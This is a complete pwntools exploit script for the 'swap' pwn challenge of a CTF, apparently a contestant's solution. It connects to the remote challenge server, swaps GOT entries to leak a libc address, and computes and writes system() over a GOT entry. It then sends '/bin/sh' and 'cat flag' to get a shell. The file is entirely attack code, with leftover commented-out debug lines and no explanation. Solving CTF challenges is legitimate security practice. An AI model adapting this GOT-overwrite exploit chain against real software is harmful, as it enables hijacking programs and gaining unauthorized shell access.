from pwn import *
from time import sleep

context.terminal = ["tmux", "splitw", "-h"]

bin_elf = ELF ("./swap")
libc_elf = ELF ("./libc.so.6-4cd1a422a9aafcdcb1931ac8c47336384554727f57a02c59806053a4693f1c71")

LOCAL = False

if LOCAL == False:
  r = remote ("pwn1.chal.ctf.westerns.tokyo", 19937)

else :
  r = process ("./swap")

puts_got = bin_elf.got["puts"]
atoi_got = bin_elf.got["atoi"]
atoll_got = bin_elf.got["atoll"]
memcpy_got = bin_elf.got["memcpy"]
sleep_got = bin_elf.got["sleep"]
system_offset = libc_elf.symbols["system"]
read_got = bin_elf.got["read"]

sleep (5)

r.recvuntil ("Your choice: \n")
r.sendline ("1")

r.recvuntil ("Please input 1st addr\n")
r.sendline (str (puts_got))

r.recvuntil ("Please input 2nd addr\n")
r.sendline (str (atoi_got))


r.recvuntil ("Your choice: \n")
#r.send ("2".ljust (0x10, '\x00'))
r.sendline ("2")

#for bufferfing
if LOCAL == True:
  r.interactive ()
r.sendline ("2")

r.recvline ()
leak = r.recvline ()[:-1]
libc_leak = u64 ("\x00" * 2 + leak + "\x00" * 2)
print "libc_leak: " + hex (libc_leak)
libc_offset = 0x3ba000
libc_base = libc_leak - libc_offset 
system = libc_base + system_offset

print "system: " + hex (system)

#sleep (1)
r.send ("".ljust (0x10, "\x00"))

#r.send (str (puts_got).ljust (0x20, "\x00"))
#r.send (str (atoi_got).ljust (0x20, "\x00"))
sleep (0.5)
r.sendline (str (puts_got).ljust (0x1f, " "))
sleep (0.5)
r.sendline (str (atoi_got).ljust (0x1f, " "))
sleep (0.5)

#r.send (p64 (read_got).ljust (0x10, '\x00'))
#r.send ("A" * 0x10)

#r.interactive ()

#for i in xrange (0x10):
r.send ("5".ljust (0x10, "\x00"))


gdb_cmd = """
b * 0x0000000000400A58
c
"""

#gdb.attach (r, gdb_cmd)



#r.interactive ()
r.recvuntil ("Your choice:")
r.sendline ("1")

r.recvuntil ("Please input 1st addr\n")
r.sendline (str (memcpy_got))

r.recvuntil ("Please input 2nd addr\n")
r.sendline (str (read_got))


r.recvuntil ("Your choice: \n")
#r.send ("2".ljust (0x10, '\x00'))
r.sendline ("2")

r.recvuntil ("Your choice:")
r.sendline ("1")

r.recvuntil ("Please input 1st addr\n")
r.sendline ("0")

r.recvuntil ("Please input 2nd addr\n")
r.sendline (str (atoll_got))


r.recvuntil ("Your choice: \n")
#r.send ("2".ljust (0x10, '\x00'))
r.sendline ("2")
#r.interactive ()

#r.sendline (p64 (system))
r.send (p64 (system))
#r.sendline (p64 (system))
#r.send (p64 (system))
#r.send (p64 (system))

r.recvuntil ("Your choice:")
r.sendline ("1")

r.recvuntil ("Please input 1st addr\n")
r.sendline ("/bin/sh\x00")
r.sendline ("cat flag")
print r.recv ()

r.interactive ()
